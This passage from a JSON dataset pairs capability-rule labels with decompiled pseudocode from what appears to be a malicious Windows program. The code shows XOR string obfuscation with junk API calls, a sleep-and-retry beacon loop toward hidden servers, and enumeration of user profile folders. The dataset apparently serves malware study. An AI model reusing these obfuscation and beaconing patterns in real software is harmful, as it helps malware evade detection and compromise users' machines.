         iVar8 = iVar8 + 1;\n                } while (iVar8 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar3, &ARG_0, var_4ch);\n                var_1h._0_1_ = '\\0';\n                var_48h = NULL;\n                var_4ch = iVar4 + 1;\n                var_14h = NULL;\n                hKey = fcn.0040cee7(0x20019);\n                param_1 = var_54h;\n                pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hKey != 0) {\n                    lpType = 3;\n                    lpcbData = NULL;\n                    var_5ch = NULL;\n                    iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    if (iVar8 == 0) {\n                        uVar2 = (*pcVar11)(8, lpcbData);\n                        var_58h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        puVar7 = var_5ch;\n                        puVar6 = var_5ch;\n                        if ((var_58h == NULL) ||\n                           (iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (hKey, &lpValueName, 0, &lpType, var_58h, &lpcbData),  puVar7 = var_58h, \n                           puVar6 = lpcbData,  iVar8 == 0)) {\n                            var_1h._0_1_ = '\\x01';\n                            var_48h = puVar7;\n                            var_14h = puVar6;\n                        }\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                    if (((var_1h != '\\0') && (var_48h != NULL)) && (var_14h != NULL)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*pcVar11)(8, var_14h);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*pcVar11)(0, param_1[1], var_14h + *param_1);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar6 = var_48h;\n                        puVar10 = iVar3 + *param_1;\n                        for (puVar7 = var_14h; puVar7 != NULL; puVar7 = puVar7 + -1) {\n                            *puVar10 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar10 = puVar10 + 1;\n                        }\n                        *param_1 = var_14h + *param_1;\n                        pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_48h);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        iVar3 = var_6ch;\n                    }\n                }\n                uVar2 = (*pcVar11)(0, iVar3);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_64h);\n            uVar2 = (*pcVar11)(0, var_68h);\n            (*pcVar1)(uVar2);\n            iVar3 = var_50h;\n        }\n        uVar2 = (*pcVar11)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2265
    },
    "0040d71c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040d71c(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    ushort var_1fh;\n    uchar var_1dh;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = -1;\n    var_8h = *0x41dd6c;\n    var_44h = 0x2d20162e;\n    var_40h = 0x2b13295c;\n    var_3ch = 0x18245320;\n    var_38h = 0x3f56272e;\n    var_4h = 5;\n    var_34h._0_1_ = 5;\n    stack0xffffffc9 = 0x3a4d3a31;\n    var_2fh = 0x40313402;\n    var_2bh = 0x166e5a35;\n    var_27h = 0x77477d08;\n    var_23h = 0x4c780f7c;\n    var_1fh = 0x797a;\n    var_1dh = 0x39;\n    var_14h = 0x4943744f;\n    var_10h._0_1_ = 0x39;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar5 != 0x280136) {\n            pcVar4[iVar7] = *(&var_14h + iVar7 % var_4h) ^ (pcVar4 + iVar7)[&var_44h - pcVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x28);\n    iVar7 = 0;\n    pcVar8 = str.AJDJV__;\n    do {\n        var_14h = 1;\n        var_4h = 0;\n        do {\n            if (pcVar8[iVar7] != '\\0') {\n                cVar2 = *pcVar4;\n                pcVar6 = pcVar4;\n                while (cVar2 != pcVar8[iVar7]) {\n                    if (cVar2 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x0040d80d;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    cVar2 = *pcVar6;\n                }\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < 0x20);\n        bVar1 = true;\ncode_r0x0040d80d:\n        if (((*pcVar8 != '\\0') && (pcVar8[0x1f] == '\\0')) && (bVar1)) {\n            iVar5 = fcn.0040e9d8();\n            if (iVar5 != -1) {\n                *var_1ch = iVar5;\n                var_ch = iVar7;\n                break;\n            }\n            var_8h = var_8h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_8h % 600000 + 60000);\n        }\n        pcVar8 = pcVar8 + 0x20;\n        iVar7 = iVar7 + 1;\n    } while (pcVar8 < 0x41da40);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return var_ch;\n}\n",
        "token_count": 1025
    },
    "0040d888": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040d888(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint *puVar6;\n    char *pcVar7;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar4 = NULL;\n    puVar6 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar2 = fcn.0040533b(),  -1 < iVar2)) {\n        uVar3 = 0;\n        var_4h = 0x44444444;\n        if (var_ch != 4) {\n            do {\n                iVar2 = 0;\n                while (*(iVar2 + uVar3 + var_8h) == *(&var_4h + iVar2)) {\n                    iVar2 = iVar2 + 1;\n                    if (3 < iVar2) {\n                        pcVar4 = uVar3 + var_8h;\n                        goto code_r0x0040d8f1;\n                    }\n                }\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < var_ch - 4U);\n        }\ncode_r0x0040d8f1:\n        if (pcVar4 != NULL) {\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.AJDJV__;\n            pcVar7 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar7 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n                pcVar7 = pcVar7 + 1;\n            }\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.AJDJV__;\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(pcVar4, str.AJDJV__ + arg_8h * 0x20);\n            do {\n                pcVar4 = pcVar4 + 0x20;\n                if (*pcVar5 != '\\0') {\n                    (*pcVar1)(pcVar4, pcVar5);\n                }\n                pcVar5 = pcVar5 + 0x20;\n            } while (pcVar5 < 0x41da20);\n        }\n        fcn.0040cd6f();\n        *0x41dd20 = var_ch;\n        pcVar4 = 0x1;\n        *0x41dd24 = var_8h;\n    }\n    return pcVar4;\n}\n",
        "token_count": 768
    },
    "0040d97b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040da44)\n// WARNING: Removing unreachable block (ram,0x0040da5f)\n// WARNING: Removing unreachable block (ram,0x0040da66)\n// WARNING: Removing unreachable block (ram,0x0040da6d)\n// WARNING: Removing unreachable block (ram,0x0040da86)\n\nuint __cdecl fcn.0040d97b(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uStack420;\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201);\n    puVar3 = &stack0xfffffe50;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = 0x41dd20;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.0040cc05();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41dae0);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar1 = fcn.0040d3fa();\n    if ((cVar1 != '\\0') && (iVar2 = fcn.0040d888(0),  iVar2 != 0)) {\n        fcn.0040cd6f();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41dae0);\n    }\n    while (*0x41dd68 == 0) {\n        iVar2 = fcn.0040d71c();\n        if (iVar2 != -1) {\n            fcn.0040ea5a();\n        }\n        uStack420 = uStack420 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uStack420 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 509
    },
    "0040df0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040df0b(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint lpcchSize;\n    int32_t var_6ch;\n    uint ARG_0;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint lpFileName;\n    uint lpProfileDir;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uchar var_8h;\n    ushort var_7h;\n    uint var_5h;\n    uint var_1h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    lpFileName = (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    ARG_0 = (*pcVar5)(uVar2);\n    lpcchSize = 0x104;\n    var_28h = 0x501b4e1d;\n    var_24h = 0x4e304a3a;\n    var_20h = 0x4a795018;\n    var_1ch = 0x50114e02;\n    var_18h = 0x4e254a2d;\n    var_14h = 0x4a37501d;\n    var_10h = 0x50074e36;\n    var_5ch = 5;\n    var_ch._0_1_ = 5;\n    var_ch._1_1_ = 0x4a;\n    var_ch._3_1_ = 0x4e;\n    var_8h = 0x11;\n    var_7h = 0x3450;\n    var_5h._0_1_ = 0x4a;\n    var_5h._1_1_ = 0x21;\n    var_5h._2_1_ = 0x4e;\n    var_5h._3_1_ = 0x74;\n    var_1h._0_1_ = 0x50;\n    var_30h = 0x50744e51;\n    var_2ch._0_2_ = 0x4a59;\n    var_ch._2_1_ = var_ch;\n    uVar2 = (*pcVar1)(8, 0x51);\n    iVar3 = (*pcVar5)(uVar2);\n    var_64h = 6;\n    iVar6 = 0;\n    var_6ch = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar4 != 0x3ffd08) {\n            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_64h) ^ (iVar6 + iVar3)[&var_28h - iVar3];\n        }\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x28);\n    var_28h = 0x6c416505;\n    var_24h = 0x31214424;\n    var_20h = 0x6530540d;\n    var_1ch = 0x44086c50;\n    var_18h = 0x54033129;\n    var_14h = 0x6c506527;\n    var_10h = 0x31394438;\n    var_ch._0_1_ = 0x38;\n    var_ch._1_1_ = 0x54;\n    var_ch._2_1_ = 0x21;\n    var_ch._3_1_ = 0x65;\n    var_8h = 0x5c;\n    var_7h = 0x246c;\n    var_5h._0_1_ = 0x44;\n    var_5h._1_1_ = 0x65;\n    var_5h._2_1_ = 0x31;\n    var_3ch = 0x6c316544;\n    var_38h._0_1_ = 0x54;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    var_7ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    var_34h = &var_28h - var_7ch;\n    var_74h = var_7ch;\n    do {\n        iVar6 = (*pcVar5)();\n        uVar2 = lpProfileDir;\n        if (iVar6 != 0xae2717) {\n            *(iVar3 + var_7ch) = *(&var_3ch + iVar3 % var_5ch) ^ (iVar3 + var_7ch)[var_34h];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x26);\n    var_78h = var_6ch;\n    iVar3 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_34h = iVar3;\n        while (iVar3 != -1) {\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x411924);\n            if ((iVar6 != 0) && (iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x411928),  iVar6 != 0)) {\n                var_58h = 0;\n                var_4ch = 0x63696336;\n                var_48h._0_2_ = 0x6c34;\n                var_54h = 0x6343636a;\n                var_50h._0_2_ = 0x6c34;\n                var_30h = 0x50696d64;\n                var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x53);\n                do {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, uVar2);\n                    uVar2 = (*pcVar5)(8, 0xd);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_60h = &var_4ch - iVar3;\n                    var_3ch = iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                        if (iVar4 != 0x9828eb) {\n                            *(iVar6 + iVar3) = *(&var_54h + iVar6 % var_64h) ^ (iVar6 + iVar3)[&var_4ch - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(lpFileName, iVar3);\n                    var_14h = 0x501a6d41;\n                    var_10h = 0x6948640f;\n                    var_ch._0_1_ = 0x23;\n                    var_ch._1_1_ = 0x53;\n                    var_ch._2_1_ = 0x38;\n                    var_ch._3_1_ = 0x6d;\n                    var_8h = 0x4c;\n                    var_7h = 0x2050;\n                    var_5h._0_1_ = 100;\n                    var_5h._1_1_ = 0x6d;\n                    var_5h._2_1_ = 0x69;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_60h = &var_14h - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n                        if (iVar4 != 0xb59b48) {\n                            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_5ch) ^ (iVar6 + iVar3)[&var_14h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar3, lpProfileDir, &psz1, (&var_7ch)[var_58h]);\n                    fcn.0040c87e(1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    uVar2 = (*pcVar5)(0, var_3ch);\n                    (*pcVar1)(uVar2);\n                    var_58h = var_58h + 1;\n                    uVar2 = lpProfileDir;\n                    iVar3 = var_34h;\n                } while (var_58h < 2);\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3, &lpFindFileData);\n            if (iVar6 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n                iVar3 = -1;\n                var_34h = -1;\n            }\n        }\n    }\n    var_24h = 0x6f1e347f;\n    var_20h = 0x4d475a30;\n    var_1ch = 0x343f491b;\n    var_18h = 0x5a1b6f20;\n    var_14h = 0x49004d5b;\n    var_10h = 0x6f68342e;\n    var_ch._0_1_ = 0x15;\n    var_ch._1_1_ = 0x5a;\n    var_ch._2_1_ = 0x60;\n    var_ch._3_1_ = 0x4d;\n    var_8h = 10;\n    var_7h = 0x3749;\n    var_5h._0_1_ = 0x34;\n    var_5h._1_1_ = 0x3d;\n    var_5h._2_1_ = 0x6f;\n    var_5h._3_1_ = 0x49;\n    var_1h._0_1_ = 0x5a;\n    var_30h = 0x6f4d345a;\n    var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x49);\n    uVar2 = (*pcVar5)(8, 0x49);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_3ch = &var_24h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar4 != 0xf5ec23) {\n            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_5ch) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar3, lpProfileDir, 0x104);\n    fcn.0040c87e(1);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, ARG_0);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, lpProfileDir);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_74h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, var_6ch);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 3208
    },
    "0040ebb1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040ebb1(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int16_t *piVar9;\n    uint32_t uVar10;\n    uint32_t in_EDX;\n    code *pcVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint16_t *var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t lpBuffer;\n    int32_t lpFindFileData;\n    int16_t *lpMem;\n    int32_t var_4h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0;\n    var_20h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (iVar5 == 0) {\n        return var_20h;\n    }\n    lpFindFileData = iVar5;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpBuffer = (*pcVar3)(uVar4);\n    if (lpBuffer == 0) goto code_r0x0040ee72;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpMem = (*pcVar3)(uVar4);\n    if (lpMem != NULL) {\n        var_48h = 0x617c651d;\n        var_44h = 0x56004141;\n        var_40h = 0x65246f19;\n        piVar6 = lpMem;\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        var_3ch._0_2_ = 0x6156;\n        var_34h = 0x61566541;\n        var_30h._0_1_ = 0x6f;\n        uVar4 = (*pcVar11)(8, 0x1d);\n        piVar6 = (*pcVar3)(uVar4);\n        iVar5 = 0;\n        var_38h = piVar6;\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            iVar12 = lpBuffer;\n            if (iVar7 != 0xe9bbc5) {\n                var_18h = 5;\n                *(iVar5 + piVar6) = *(&var_34h + iVar5 % 5) ^ (iVar5 + piVar6)[&var_48h - piVar6];\n            }\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xe);\n        piVar9 = piVar6;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpBuffer, 0x103 - (piVar9 - (piVar6 + 1) >> 1));\n        if (iVar5 == 0) {\ncode_r0x0040ee44:\n            uVar4 = (*pcVar11)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        else {\n            if (var_14h == 0) {\n                var_1ch = fcn.004017d6();\n                var_1ch = var_1ch & 0xff;\n                arg_8h = fcn.004017d6();\n                arg_8h = arg_8h & 0xff;\n            }\n            var_14h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar12, piVar6);\n            var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, lpFindFileData);\n            if (var_18h == -1) goto code_r0x0040ee44;\n            iVar5 = lpFindFileData;\n            iVar12 = lpBuffer;\n            for (uVar13 = 0; (uVar13 <= var_1ch || (uVar13 <= var_14h)); uVar13 = uVar13 + 1) {\n                if ((uVar13 == var_1ch) || (uVar13 == var_14h)) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar5 + 0x2c, 0, 0x2e);\n                    var_34h = (iVar7 + (-0x2c - iVar5) >> 1) >> 1;\n                    var_20h = 0;\n                    if ((var_4h != 0) && (var_20h = var_34h - 4,  var_34h < var_20h)) {\n                        var_20h = 0;\n                    }\n                    if (4 < var_34h) {\n                        var_34h = 4;\n                    }\n                    piVar6 = lpMem;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != var_24h);\n                    for (piVar6 = lpMem + (piVar6 - (lpMem + 1) >> 1); *piVar6 != 0; piVar6 = piVar6 + 1) {\n                    }\n                    var_28h = iVar5 + (var_20h + 0x16) * 2;\n                    var_20h = *var_28h;\n                    if (*var_28h != 0) {\n                        iVar7 = var_28h - piVar6;\n                        uVar8 = var_20h;\n                        uVar10 = var_34h;\n                        do {\n                            iVar5 = lpFindFileData;\n                            iVar12 = lpBuffer;\n                            if (uVar10 == 0) break;\n                            *piVar6 = uVar8;\n                            piVar6 = piVar6 + 1;\n                            uVar10 = uVar10 - 1;\n                            uVar2 = *(iVar7 + piVar6);\n                            uVar8 = uVar2;\n                        } while (uVar2 != 0);\n                    }\n                    var_4h = var_4h + var_34h;\n                    *piVar6 = 0;\n                    var_2ch = var_34h;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_18h, iVar5);\n                if (iVar7 == 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, iVar5);\n                }\n            }\n            *arg_10h = lpMem;\n            var_20h = 1;\n            lpMem[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_18h);\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar6 = var_38h;\n        }\n        uVar4 = (*pcVar11)(0, piVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar5 = lpFindFileData;\n    }\n    uVar4 = (*pcVar11)(0, lpBuffer);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\ncode_r0x0040ee72:\n    uVar4 = (*pcVar11)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_20h;\n}\n",
        "token_count": 1969
    },
    "0040bfd5": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040bfd5(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 236
    },
    "00409be5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
